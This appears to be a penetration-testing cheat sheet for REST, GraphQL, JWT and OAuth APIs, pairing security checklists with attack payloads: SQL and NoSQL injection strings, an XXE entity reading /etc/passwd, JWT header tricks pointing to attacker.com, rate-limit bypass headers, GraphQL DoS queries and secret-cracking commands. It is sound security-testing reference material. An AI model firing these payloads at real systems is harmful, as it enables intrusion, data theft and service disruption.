# 🔌 API Testing Methodology

Quick reference for testing REST, GraphQL, and other APIs.

## API Reconnaissance

### 1. Discover API Endpoints
```bash
# Common paths
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger.json
/openapi.json
/api-docs
/docs
/wadl

# Check for documentation
/swagger-ui/
/api/docs
/redoc
```

### 2. Find API Documentation
- Swagger/OpenAPI: `/swagger.json`, `/openapi.yaml`
- Postman collections
- API documentation sites
- WADL files
- GraphQL introspection

---

## REST API Testing

### Common HTTP Methods
```bash
GET /api/users          # Read
POST /api/users         # Create
PUT /api/users/123      # Update (full)
PATCH /api/users/123    # Update (partial)
DELETE /api/users/123   # Delete
OPTIONS /api/users      # Allowed methods
HEAD /api/users         # Headers only
```

### Test Each Endpoint

**1. Authentication Bypass**
```bash
# No token
# Expired token
# Invalid token
# Token from different user
# Token manipulation
```

**2. Authorization Issues**
```bash
# IDOR: Access other user's resources
GET /api/users/123 (logged in as user 456)

# Privilege escalation
# Regular user accessing admin endpoints
```

**3. Input Validation**
```bash
# Injection attacks
{"name": "' OR '1'='1"}
{"id": "1; DROP TABLE users--"}

# Type juggling
{"price": -100}
{"quantity": "abc"}
{"isAdmin": true}
```

**4. Mass Assignment**
```json
POST /api/users
{
  "name": "attacker",
  "email": "test@test.com",
  "role": "admin",        // Should not be settable
  "isVerified": true      // Should not be settable
}
```

---

## GraphQL Testing

### Introspection Query
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

### Common Vulnerabilities

**1. Introspection Enabled (Information Disclosure)**
```graphql
# If enabled, reveals entire schema
query IntrospectionQuery {
  __schema {
    types {
      name
    }
  }
}
```

**2. SQL Injection**
```graphql
query {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}
```

**3. DoS via Batching**
```graphql
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
  # Repeat 1000 times...
}
```

**4. DoS via Nested Queries**
```graphql
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              # Infinite nesting
            }
          }
        }
      }
    }
  }
}
```

**5. Authorization Bypass**
```graphql
query {
  admin {           # Try accessing admin-only fields
    secretData
  }
}
```

---

## JWT Testing

### Decode JWT
```bash
# JWT structure: header.payload.signature
echo "eyJhbGc..." | base64 -d
```

### Common JWT Vulnerabilities

**1. None Algorithm**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**2. Algorithm Confusion (RS256 to HS256)**
- Change algorithm from RS256 to HS256
- Use public key as HMAC secret

**3. Weak Secret**
```bash
# Brute force JWT secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

**4. Kid (Key ID) Manipulation**
```json
{
  "alg": "HS256",
  "kid": "../../dev/null"    // Path traversal
}
```

**5. JKU (JWK Set URL) Injection**
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```

---

## OAuth 2.0 Testing

### Common Flows to Test
1. Authorization Code Grant
2. Implicit Grant
3. Client Credentials Grant
4. Password Grant

### Vulnerabilities

**1. Open Redirect**
```
/oauth/authorize?redirect_uri=https://attacker.com
```

**2. CSRF**
```
# Missing state parameter
/oauth/authorize?response_type=code&client_id=123
```

**3. Token Leakage**
- Tokens in URL (referer header)
- Tokens in browser history
- Tokens in logs

**4. Scope Manipulation**
```
# Request elevated permissions
scope=read+write+admin
```

---

## API Security Checklist

### Authentication
- [ ] Tokens expire appropriately
- [ ] Tokens invalidated on logout
- [ ] Strong authentication required
- [ ] Rate limiting on login attempts
- [ ] No credentials in URL

### Authorization
- [ ] User can only access own resources
- [ ] Role-based access control enforced
- [ ] No IDOR vulnerabilities
- [ ] Admin endpoints protected
- [ ] API keys properly scoped

### Input Validation
- [ ] All inputs validated
- [ ] Type checking enforced
- [ ] SQL injection protected
- [ ] NoSQL injection protected
- [ ] XML/XXE protected
- [ ] Command injection protected

### Output Encoding
- [ ] Proper content-type headers
- [ ] JSON responses properly encoded
- [ ] No sensitive data leakage
- [ ] Error messages sanitized

### Rate Limiting
- [ ] Rate limits on all endpoints
- [ ] Rate limits per user/IP
- [ ] Prevents brute force
- [ ] Prevents DoS

### HTTPS
- [ ] All endpoints use HTTPS
- [ ] HTTP redirects to HTTPS
- [ ] Secure cookies (Secure flag)
- [ ] HSTS header present

---

## Testing Tools

### API Clients
- Burp Suite
- Postman
- Insomnia
- cURL
- httpie

### Specialized Tools
```bash
# Arjun - Parameter discovery
arjun -u https://api.target.com/endpoint

# Kiterunner - API endpoint discovery
kr scan https://target.com -w routes.txt

# GraphQL tools
graphqlmap
graphw00f
```

---

## Common Attack Payloads

### SQL Injection (JSON)
```json
{"id": "1' OR '1'='1"}
{"search": "' UNION SELECT NULL--"}
```

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### XXE in XML APIs
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><user>&xxe;</user></root>
```

### Parameter Pollution
```
?id=1&id=2
?role=user&role=admin
```

---

## Rate Limiting Bypass

```bash
# Try different headers
X-Forwarded-For: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# Try different IPs
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 10.0.0.1

# Null byte
X-Forwarded-For: 1.2.3.4%00

# Add spaces
X-Forwarded-For: 1.2.3.4
```

---

## API Fuzzing

```bash
# Ffuf for API fuzzing
ffuf -u https://api.target.com/v1/FUZZ -w api_endpoints.txt

# Burp Intruder
# Fuzz all parameters, headers, etc.

# Wfuzz
wfuzz -c -z file,wordlist.txt https://api.target.com/FUZZ
```

---

## Report Template Sections

1. **Endpoint**: `/api/users/123`
2. **Method**: `GET`
3. **Authentication**: Required/Not Required
4. **Vulnerability**: IDOR
5. **Impact**: Access to other users' data
6. **PoC**:
   ```bash
   curl -H "Authorization: Bearer <token>" https://api.target.com/api/users/456
   ```
7. **Fix**: Validate user has permission to access requested resource

---

## Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [GraphQL Security Best Practices](https://leapgraph.com/graphql-api-security)
- [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)
